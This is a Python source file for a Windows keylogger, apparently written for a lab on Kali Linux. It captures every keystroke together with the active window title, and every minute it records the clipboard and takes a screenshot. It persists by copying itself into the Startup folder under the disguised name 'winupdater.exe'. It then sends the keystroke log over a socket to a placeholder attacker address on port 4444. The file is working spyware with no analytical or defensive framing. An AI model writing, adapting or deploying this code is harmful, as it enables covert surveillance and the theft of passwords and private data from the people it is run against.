from pynput import keyboard
import logging
import win32gui
import time
import os
import pyperclip
from PIL import ImageGrab
from datetime import datetime
from threading import Timer
import shutil
import sys
import socket

def exfiltrate_logs(ip="Kali IP Address", port=4444):
    try:
        log_path = os.path.join(log_dir, "keylogs.txt")
        with open(log_path, "rb") as file:
            data = file.read()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendall(data)
        s.close()

        logging.info(f"[Exfil] Sent logs to {ip}:{port}")
    except Exception as e:
        logging.warning(f"[Exfil] Failed to send logs: {e}")
print("Sending logs...")



# === Setup ===
log_dir = os.path.join(os.getcwd(), "logs")
os.makedirs(log_dir, exist_ok=True)

log_file = os.path.join(log_dir, "keylogs.txt")
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

last_window = None
last_key = None  # for kill switch

# === Functions ===
def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown"

def log_clipboard():
    try:
        clipboard = pyperclip.paste()
        if clipboard:
            logging.info(f"[Clipboard] {clipboard}")
    except:
        logging.warning("Failed to read clipboard")

def capture_screenshot():
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    img_path = os.path.join(log_dir, f"screenshot_{now}.png")
    try:
        img = ImageGrab.grab()
        img.save(img_path)
        logging.info(f"[Screenshot captured] {img_path}")
    except Exception as e:
        logging.warning(f"Screenshot failed: {e}")

def periodic_tasks():
    log_clipboard()
    capture_screenshot()
    Timer(60, periodic_tasks).start()  # repeat every 60 seconds
# === Key Logger ===
def on_press(key):
    global last_window, last_key

    # Track active window changes
    current_window = get_active_window()
    if current_window != last_window:
        last_window = current_window
        logging.info(f"\n\n[Window: {current_window}]\n")

    # Kill switch: double 'q' press
    try:
        if last_key == 'q' and key.char == 'q':
            logging.info("[Exit on double 'q']")
            exfiltrate_logs()
            os._exit(0)

        last_key = key.char
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")
        last_key = None  # reset if not a character key


# === Start Logging ===
logging.info("=== Keylogger Started ===")
def add_to_startup():
    try:
        file_path = os.path.realpath(sys.argv[0])
        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        target_path = os.path.join(startup_dir, "winupdater.exe")  # disguised name

        if not os.path.exists(target_path):
            shutil.copy(file_path, target_path)
            logging.info(f"[Startup] Copied to startup folder as {target_path}")
        else:
            logging.info(f"[Startup] Already exists in startup folder.")
    except Exception as e:
        logging.warning(f"[Startup] Failed to copy to startup folder: {e}")
add_to_startup()
periodic_tasks()

periodic_tasks()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

